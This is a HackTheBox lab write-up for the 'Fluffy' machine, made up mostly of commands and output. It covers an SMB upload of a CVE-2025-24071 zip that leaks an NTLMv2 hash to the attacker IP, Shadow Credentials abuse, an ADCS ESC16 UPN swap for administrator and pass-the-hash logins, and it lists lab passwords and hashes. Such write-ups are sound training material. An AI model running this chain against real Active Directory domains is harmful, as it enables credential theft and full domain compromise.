---
title: "Fluffy - HackTheBox"
description: "Exploitation de CVE-2025-24071 pour capturer un hash NTLMv2, Shadow Credentials attack sur winrm_svc, et abus ADCS ESC16 pour obtenir le hash admin."
date: 2026-04-14
tags: ["active-directory", "adcs", "shadow-credentials", "cve-2025-24071", "windows", "easy"]
draft: false
---

![alt text](./images/{1FC22167-F357-48EF-B611-D50C0D9D897C}.png)

| name         | password                         | information                |
| ------------ | -------------------------------- | -------------------------- |
| j.fleischman | j.fleischman                     | Starting creds             |
| p.agila      | prometheusx-303                  | Grep using CVE + responder |
| ca_svc       | ca0f4f9e9eb8a092addf53bb03fc98c8 | NTHASH                     |
| winrm        | 33bd09dcd697600edf6b3a7af4875767 | NTHASH                     |

# Nmap and BH
Most important ports:

| Port              | Service | Other                 |
| ----------------- | ------- | --------------------- |
| 53                | DNS     | Simple DNS plus => DC |
| 88                | Krbr    | TIME                  |
| 139               | Netbios |                       |
| 445               | SMB     |                       |
| 389/636/3268/3269 | LDAP    |                       |
| 5985              | WinRM   |                       |
```bash
bloodhound-python --zip -c All -d "fluffy.htb" -u "j.fleischman" -p "J0elTHEM4n1990\!" -dc "DC01.fluffy.htb" -ns $TARGET
```
## Service enumeration
## SMB
```bash
Guesst
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
IT
NETLOGON                        Logon server share
SYSVOL                          Logon server share
```
```perl
smbclient "//$TARGET/IT" -U "j.fleischman%J0elTHEM4n1990\!"
```
# Exploitation - CVE + Upload + Hash retrieve + AGILA user
```bash
python CVE-2025-24071.py -i 10.10.14.240
smbclient "//10.129.232.88/IT" -U "j.fleischman%J0elTHEM4n1990\!"
smb: \> put malicious.zip
p.agila::FLUFFY:1122334455667788:9E9241CF2E253310282BCDD9316768FD:010100000000000080C31D90E17BDC0149B8CF910D9AC1DF0000000002000800310049003100490001001E00570049004E002D005600570030003700500057004800430057005200390004003400570049004E002D00560057003000370050005700480043005700520039002E0031004900310049002E004C004F00430041004C000300140031004900310049002E004C004F00430041004C000500140031004900310049002E004C004F00430041004C000700080080C31D90E17BDC0106000400020000000800300030000000000000000100000000200000105679A1B7B5FD63F312F1199A30DBB55FAE848FB2E40F22144BE0AE9FC7F2C90A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200340030000000000000000000
p.agila:prometheusx-303
```
# Exploitation - GetWinRM user
AGILA -> Service accounts managers -> Service accounts -> winrm_svc
```bash
# 1. Shadow credential attack - GenericWrite
pywhisker -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add" 
[i] Passwort für PFX: 0gg15rPJZWpWQn3QXjNO
# 2. gettgtpkinit -> Request kerberos TGT
gettgtpkinit.py fluffy.htb/winrm_svc -cert-pfx 7nxkLTwD.pfx -pfx-pass 0gg15rPJZWpWQn3QXjNO winrm.ccache
-> 4e93fbc2c6f755daa91ba97b3ba2ab42e8de31419e72350a79594785cee24463
# 3. getnthash -> extract nthash from ticket
getnthash.py fluffy.htb/winrm_svc -key "4e93fbc2c6f755daa91ba97b3ba2ab42e8de31419e72350a79594785cee24463"
-> 33bd09dcd697600edf6b3a7af4875767
# 4. evil winrm to DC
evil-winrm -i 10.129.232.88 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
# 5. Do the same for ca account:
ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8 
```
# Exploitation - CA misconfigured - ESC16
```bash
certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
-> ESC16: Security Extension is disabled.
# READ ca_svc UPN
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
userPrincipalName: ca_svc@fluffy.htb
# Update to administrator
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
# check 
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
userPrincipalName: administrator
# Now request certificate as admin
certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
-> Got certificate with UPN 'administrator'
# Putting back the user ca_svc UPN
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
# Request TGT for admin
certipy auth -dc-ip 10.129.232.88 -pfx administrator.pfx -u administrator -domain fluffy.htb
-> Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
# Connect as admin
evil-winrm -i 10.129.232.88 -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
```
